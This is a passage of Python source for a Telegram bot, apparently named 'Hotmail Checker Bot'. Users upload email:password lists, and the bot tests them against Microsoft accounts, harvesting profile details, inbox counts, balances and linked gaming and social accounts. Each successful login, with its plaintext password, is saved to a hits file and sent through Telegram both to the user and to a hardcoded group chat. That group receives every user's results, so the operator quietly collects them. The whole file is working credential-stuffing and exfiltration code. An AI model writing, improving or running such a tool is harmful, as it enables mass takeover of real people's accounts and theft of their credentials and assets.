                "User-Agent":     "Outlook-Android/2.0",
                "Authorization":  f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
            }
            country, name = "", ""
            try:
                r5 = self.session.get(
                    "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                    headers=profile_headers, timeout=15)
                if r5.status_code == 200:
                    profile = r5.json()
                    country = self.parse_country_from_json(profile)
                    name    = self.parse_name_from_json(profile)
            except: pass

            msg_count = 0
            try:
                r_inbox = self.session.get(
                    "https://graph.microsoft.com/v1.0/me/mailFolders/inbox",
                    headers=profile_headers, timeout=12)
                if r_inbox.status_code == 200:
                    msg_count = r_inbox.json().get('totalItemCount', 0)
            except: pass

            ms_result         = self.check_microsoft_subscriptions(email, password, access_token, cid)
            psn_result        = self.check_psn(email, access_token, cid)
            steam_result      = self.check_steam(email, access_token, cid)
            supercell_result  = self.check_supercell(email, access_token, cid)
            tiktok_result     = self.check_tiktok(email, access_token, cid)
            minecraft_result  = self.check_minecraft(email, access_token, cid)
            services_found    = self.check_regular_services(access_token, cid, email)
            custom_svc_result = self.check_custom_services(access_token, cid)

            return {
                "status":          "HIT",
                "country":         country,
                "name":            name,
                "msg_count":       msg_count,
                "email":           email,
                "password":        password,
                "services":        services_found,
                "custom_services": custom_svc_result,
                "_access_token":   access_token,
                "_refresh_token":  token_json.get("refresh_token", ""),
                **ms_result,
                **psn_result,
                **steam_result,
                **supercell_result,
                **tiktok_result,
                **minecraft_result,
            }
        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT"}
        except Exception as e:
            return {"status": "ERROR", "error": str(e)}


# ═══════════════════════════════════════════════════════════════
#  Result Formatter  →  email:pass | country | xbox | balance | hypixel | services
# ═══════════════════════════════════════════════════════════════
def format_result_line(email, password, result):
    """Returns a single formatted line for the results file."""
    country = result.get("country", "")
    flag    = get_flag(country)
    name    = result.get("name", "")

    # Xbox
    xbox        = result.get("xbox", {})
    xbox_status = xbox.get("status", "N/A")
    xbox_str    = xbox.get("details", xbox_status) if xbox_status != "N/A" else ""

    # Balance
    balance_parts = []
    ms_data = result.get("xbox", {})
    if result.get("balance"):
        balance_parts.append(str(result["balance"]))
    elif result.get("balance_amount") is not None:
        balance_parts.append(format_currency(
            result["balance_amount"], result.get("balance_currency")))
    if result.get("rewards_points"):
        balance_parts.append(f"Rewards:{result['rewards_points']}")
    balance_str = " | ".join(balance_parts)

    # Hypixel
    hyp_parts = []
    if result.get("hypixel_status") == "FOUND":
        if result.get("hypixel_level"):
            hyp_parts.append(f"Lvl:{result['hypixel_level']}")
        if result.get("hypixel_bw_stars"):
            hyp_parts.append(f"BW★{result['hypixel_bw_stars']}")
        if result.get("hypixel_sb_coins"):
            hyp_parts.append(f"SB:{result['hypixel_sb_coins']}")
    hypixel_str = " ".join(hyp_parts)

    # Subscriptions
    subs = []
    if result.get("psn_status") == "HAS_ORDERS":
        subs.append(f"PSN({result.get('psn_emails_count',0)})")
    if result.get("steam_status") == "HAS_PURCHASES":
        subs.append(f"Steam({result.get('steam_count',0)})")
    if result.get("supercell_status") == "LINKED":
        subs.append(f"SC({len(result.get('supercell_games',[]))})")
    if result.get("tiktok_status") == "LINKED":
        subs.append(f"TT:@{result.get('tiktok_username','')}")
    if result.get("minecraft_status") == "OWNED":
        subs.append(f"MC:{result.get('minecraft_username','')}")
    for csvc, cd in result.get("custom_services", {}).items():
        if cd.get("status") == "FOUND":
            lbl = csvc.upper()
            if cd.get("vip"):
                lbl += "⭐VIP"
            elif cd.get("total"):
                lbl += f"({cd['total']})"
            elif cd.get("found_count"):
                lbl += f"({cd['found_count']})"
            subs.append(lbl)

    # Services
    services_found = [s for s, v in result.get("services", {}).items() if v]

    # Build line
    parts = [f"{email}:{password}"]
    if flag or country:
        parts.append(f"{flag}{country}")
    if name:
        parts.append(name)
    if xbox_str:
        parts.append(f"Xbox:{xbox_str}")
    if balance_str:
        parts.append(balance_str)
    if hypixel_str:
        parts.append(f"Hypixel:{hypixel_str}")
    if subs:
        parts.append(" ".join(subs))
    if services_found:
        parts.append(", ".join(services_found[:10]))

    return " | ".join(parts)


def format_tg_message(email, password, result):
    """Returns a shorter Telegram notification message."""
    line = format_result_line(email, password, result)
    return f"✅ <code>{line}</code>"


# ═══════════════════════════════════════════════════════════════
#  Telegram API helpers
# ═══════════════════════════════════════════════════════════════
def tg_send(chat_id, text, reply_markup=None, parse_mode="HTML"):
    try:
        payload = {"chat_id": chat_id, "text": text[:4096], "parse_mode": parse_mode}
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        requests.post(f"{API_BASE}/sendMessage", data=payload, timeout=10)
    except: pass

def tg_send_doc(chat_id, file_path, caption=""):
    try:
        with open(file_path, "rb") as f:
            requests.post(f"{API_BASE}/sendDocument",
                          files={"document": f},
                          data={"chat_id": chat_id, "caption": caption[:1024]},
                          timeout=60)
    except: pass

def tg_answer_callback(callback_id, text=""):
    try:
        requests.post(f"{API_BASE}/answerCallbackQuery",
                      data={"callback_query_id": callback_id, "text": text},
                      timeout=5)
    except: pass

def tg_get_updates(offset=None):
    try:
        params = {"timeout": 20, "limit": 100}
        if offset:
            params["offset"] = offset
        r = requests.get(f"{API_BASE}/getUpdates", params=params, timeout=25)
        if r.status_code == 200:
            return r.json().get("result", [])
    except: pass
    return []

def get_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text.strip()
    except:
        return "Unknown"

# ─── Inline keyboard: Stop button ───────────────────────────────
def stop_keyboard():
    return {
        "inline_keyboard": [[
            {"text": "⏹ Stop", "callback_data": "stop_check"}
        ]]
    }

# ═══════════════════════════════════════════════════════════════
#  Session state per user
# ═══════════════════════════════════════════════════════════════
# user_id → {
#   "running": bool,
#   "stop_event": threading.Event,
#   "stats": {total, checked, hits, bads, errors},
#   "hits_file": path,
#   "thread": Thread,
#   "status_msg_id": int,
# }
_sessions = {}
_sessions_lock = threading.Lock()


def _run_check(user_id, chat_id, accounts, hits_path):
    """Background thread: check accounts, update user."""
    with _sessions_lock:
        sess = _sessions.get(user_id, {})
        stop_event = sess.get("stop_event", threading.Event())
        stats      = sess.get("stats", {"total": len(accounts), "checked": 0,
                                        "hits": 0, "bads": 0, "errors": 0})
    stats["total"] = len(accounts)

    checker = UnifiedChecker()
    hits_buf = []

    def flush():
        if not hits_buf:
            return
        with open(hits_path, "a", encoding="utf-8") as f:
            f.writelines(l + "\n" for l in hits_buf)
        hits_buf.clear()

    # Send start message with stop button
    tg_send(chat_id,
            f"▶️ Started checking <b>{len(accounts)}</b> accounts...",
            reply_markup=stop_keyboard())

    for email, password in accounts:
        if stop_event.is_set():
            break
        try:
            result = checker.check(email, password)
        except Exception as e:
            result = {"status": "ERROR", "error": str(e)}

        stats["checked"] += 1
        status = result.get("status", "ERROR")

        if status == "HIT":
            stats["hits"] += 1
            line = format_result_line(email, password, result)
            hits_buf.append(line)
            # Send to user
            tg_send(chat_id, format_tg_message(email, password, result))
            # Send to group
            tg_send(GROUP_ID, format_tg_message(email, password, result))
            if len(hits_buf) >= 10:
                flush()

        elif status in ("BAD",):
            stats["bads"] += 1
        else:
            stats["errors"] += 1

        # Progress update every 25 accounts
        if stats["checked"] % 25 == 0:
            tg_send(chat_id,
                    f"📊 Progress: {stats['checked']}/{stats['total']}"
                    f" | ✅ Hits: {stats['hits']}"
                    f" | ❌ Bad: {stats['bads']}"
                    f" | ⚠️ Errors: {stats['errors']}",
                    reply_markup=stop_keyboard())

        # Throttle a tiny bit
        time.sleep(0.05)

    flush()

    # Done — send summary + file
    stopped = stop_event.is_set()
    summary = (
        f"{'⏹ Stopped' if stopped else '✅ Done!'}\n\n"
        f"📋 Checked : {stats['checked']}/{stats['total']}\n"
        f"✅ Hits    : {stats['hits']}\n"
        f"❌ Bad     : {stats['bads']}\n"
        f"⚠️ Errors  : {stats['errors']}"
    )
    tg_send(chat_id, summary)

    if os.path.exists(hits_path) and os.path.getsize(hits_path) > 0:
        caption = f"🎯 Hits — {stats['hits']} accounts"
        tg_send_doc(chat_id, hits_path, caption)
        tg_send_doc(GROUP_ID, hits_path, caption)
    else:
        tg_send(chat_id, "📂 No hits found.")

    with _sessions_lock:
        if user_id in _sessions:
            _sessions[user_id]["running"] = False


def _start_checking(user_id, chat_id, accounts):
    """Start a check session for a user."""
    with _sessions_lock:
        if _sessions.get(user_id, {}).get("running"):
            tg_send(chat_id, "⚠️ Already running. Press Stop first.")
            return

        stop_event = threading.Event()
        timestamp  = datetime.now().strftime("%Y%m%d_%H%M%S")
        hits_dir   = Path("hits"); hits_dir.mkdir(exist_ok=True)
        hits_path  = str(hits_dir / f"hits_{user_id}_{timestamp}.txt")

        _sessions[user_id] = {
            "running":    True,
            "stop_event": stop_event,
            "stats":      {"total": len(accounts), "checked": 0,
                           "hits": 0, "bads": 0, "errors": 0},
            "hits_path":  hits_path,
        }

    t = threading.Thread(
        target=_run_check,
        args=(user_id, chat_id, accounts, hits_path),
        daemon=True)
    t.start()
    with _sessions_lock:
        _sessions[user_id]["thread"] = t


def _stop_checking(user_id, chat_id, callback_id=None):
    if callback_id:
        tg_answer_callback(callback_id, "Stopping...")
    with _sessions_lock:
        sess = _sessions.get(user_id)
        if not sess or not sess.get("running"):
            tg_send(chat_id, "ℹ️ Nothing is running.")
            return
        sess["stop_event"].set()
    tg_send(chat_id, "⏹ Stop signal sent — waiting for current account to finish...")


# ═══════════════════════════════════════════════════════════════
#  Main Bot Loop
# ═══════════════════════════════════════════════════════════════
def parse_accounts(text):
    """Parse email:pass lines from text."""
    accounts = []
    for line in text.splitlines():
        line = line.strip()
        if ":" in line:
            parts = line.split(":", 1)
            if len(parts) == 2 and "@" in parts[0]:
                accounts.append((parts[0].strip(), parts[1].strip()))
    return accounts


def main():
    print(f"[BOT] Starting — IP: {get_ip()}")
    print(f"[BOT] Token: {BOT_TOKEN[:20]}...")
    tg_send(GROUP_ID, f"🟢 Bot started\nIP: <code>{get_ip()}</code>")

    offset = None
    while True:
        try:
            updates = tg_get_updates(offset)
            for upd in updates:
                offset = upd["update_id"] + 1

                # ── Callback query (Stop button) ──────────────────────
                if "callback_query" in upd:
                    cb   = upd["callback_query"]
                    data = cb.get("data", "")
                    uid  = cb["from"]["id"]
                    cid  = cb["message"]["chat"]["id"]
                    if data == "stop_check":
                        _stop_checking(uid, cid, cb["id"])
                    continue

                # ── Regular message ───────────────────────────────────
                if "message" not in upd:
                    continue
                msg     = upd["message"]
                uid     = msg["from"]["id"]
                cid     = msg["chat"]["id"]
                text    = msg.get("text", "").strip()
                doc     = msg.get("document")

                # /start
                if text.startswith("/start"):
                    tg_send(cid,
                        "👋 <b>Hotmail Checker Bot</b>\n\n"
                        "📁 Send a <b>.txt</b> file with accounts in format:\n"
                        "<code>email:password</code>\n\n"
                        "The bot will check all accounts and send you the results.\n\n"
                        "/stop — Stop current check\n"
                        "/status — Check progress\n"
                        "/ip — Show server IP")
                    continue

                # /stop
                if text.startswith("/stop"):
                    _stop_checking(uid, cid)
                    continue

                # /status
                if text.startswith("/status"):
                    with _sessions_lock:
                        sess = _sessions.get(uid)
                    if not sess or not sess.get("running"):
                        tg_send(cid, "ℹ️ No active check.")
                    else:
                        st = sess["stats"]
                        tg_send(cid,
                            f"📊 <b>Running...</b>\n"
                            f"Checked : {st['checked']}/{st['total']}\n"
                            f"✅ Hits : {st['hits']}\n"
                            f"❌ Bad  : {st['bads']}\n"
                            f"⚠️ Errors: {st['errors']}",
                            reply_markup=stop_keyboard())
                    continue

                # /ip
                if text.startswith("/ip"):
                    tg_send(cid, f"🌐 IP: <code>{get_ip()}</code>")
                    continue

                # File upload
                if doc:
                    fname = doc.get("file_name", "")
                    fid   = doc.get("file_id")
                    if not fid:
                        continue

                    # Download file
                    try:
                        r = requests.get(
                            f"{API_BASE}/getFile",
                            params={"file_id": fid}, timeout=10)
                        fpath = r.json()["result"]["file_path"]
                        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{fpath}"
                        content  = requests.get(file_url, timeout=30).text
                    except Exception as e:
                        tg_send(cid, f"❌ Failed to download file: {e}")
                        continue

                    accounts = parse_accounts(content)
                    if not accounts:
                        tg_send(cid,
                            "❌ No valid accounts found.\n"
                            "Format: <code>email:password</code> (one per line)")
                        continue

                    # Count MS accounts
                    MS_DOMAINS = {
                        'hotmail.com','outlook.com','live.com','msn.com',
                        'hotmail.co.uk','hotmail.fr','hotmail.de','hotmail.it',
                        'hotmail.es','live.co.uk','windowslive.com',
                        'hotmail.nl','hotmail.com.br','hotmail.com.ar'
                    }
                    ms_acc = [(e,p) for e,p in accounts
                              if e.split('@')[-1].lower() in MS_DOMAINS]
                    other  = [(e,p) for e,p in accounts
                              if e.split('@')[-1].lower() not in MS_DOMAINS]

                    tg_send(cid,
                        f"📂 File received: <b>{fname}</b>\n"
                        f"Total accounts : <b>{len(accounts)}</b>\n"
                        f"Microsoft      : <b>{len(ms_acc)}</b>\n"
                        f"Other (skipped): <b>{len(other)}</b>\n\n"
                        "🔄 Starting check...")

                    if not ms_acc:
                        tg_send(cid, "❌ No Microsoft accounts found (hotmail/outlook/live/msn).")
                        continue

                    _start_checking(uid, cid, ms_acc)
                    continue

                # Unknown text
                if text:
                    tg_send(cid,
                        "📁 Send a .txt file with email:password accounts\n"
                        "or use /start for help.")

        except KeyboardInterrupt:
            print("\n[BOT] Stopped.")
            break
        except Exception as e:
            print(f"[BOT] Loop error: {e}")
            time.sleep(5)


if __name__ == "__main__":
    main()
